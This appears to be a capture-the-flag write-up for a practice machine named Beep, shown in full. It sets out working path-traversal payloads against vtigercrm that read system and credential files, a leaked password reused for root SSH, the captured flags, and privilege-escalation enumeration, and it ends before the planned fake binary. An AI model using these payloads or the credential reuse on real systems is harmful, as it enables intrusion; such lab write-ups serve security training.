We have a login page hosted on the default web page
Its running some kind of service named Elastix
Our first step should be to enumerate this web directory

I've found a few interesting things: 
```bash
/mail    (Status: 301) [Size: 316] [--> https://10.129.229.183/mail/]
/admin   (Status: 301) [Size: 317] [--> https://10.129.229.183/admin/]
/configs (Status: 301) [Size: 319] [--> https://10.129.229.183/configs/]
```

We have a login page for `/mail` and `/admin`

```
https://10.129.229.183/admin/config.php
```

In failing to login we are sent to `/admin/config.php` and we find some version info for `FreePBX version 2.8.1.4`

```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

```
AMPDBPASS=jEhdIekWmdjE
```

```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

```
https://10.129.42.168/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action

view-source:https://10.129.42.168/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action
```

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 fanis@10.129.14.86
```

```
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    root@10.129.14.86

password: jEhdIekWmdjE
```

```
[root@beep ~]# whoami
root
```

```
[root@beep fanis]# cat user.txt 
1bdf5ba85c5eaf83b86cf0413ce21bdd
```

```
[root@beep ~]# cat root.txt 
c028dae6e9912565f145fc9776e3990f
```

---

# SUID's and PATH Hijacking 

```php
find / -perm -4000 -type f 2>/dev/null

/usr/bin/sperl5.8.8
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/at
/usr/bin/chage
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/newgrp

/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/libexec/mc/cons.saver
/usr/libexec/openssh/ssh-keysign
/usr/sbin/ccreds_validate
/usr/sbin/userhelper
/usr/sbin/suexec
/usr/sbin/usernetctl
/usr/kerberos/bin/ksu
/bin/mount
/bin/umount
/bin/su
/bin/ping
/bin/ping6
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/sbin/mount.nfs
/sbin/umount.nfs
/sbin/umount.nfs4
/sbin/mount.nfs4
/sbin/unix_chkpwd
```

A list of SUID binaries on beep
https://gtfobins.github.io/#cronta
Check what is vulnerable

```php
sudo -l

sudo -l
Matching Defaults entries for notdrew1 on htb-e0ligctgs4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/root/.local/bin

User notdrew1 may run the following commands on htb-e0ligctgs4:
    (ALL) NOPASSWD: ALL
```

```php
[root@beep fanis]# env -i /usr/bin/passwd
Changing password for user root.
New UNIX password: 
BAD PASSWORD: it is WAY too short
Retype new UNIX password: 
passwd: all authentication tokens updated successfully.
```

changed the root users password

```php
find / -type f -writable -exec ls -l {} \; 2>/dev/null | grep cron
```

No writable cron files were found on the machine

```php
crontab -l
no crontab for root
```

Let's create a fake binary

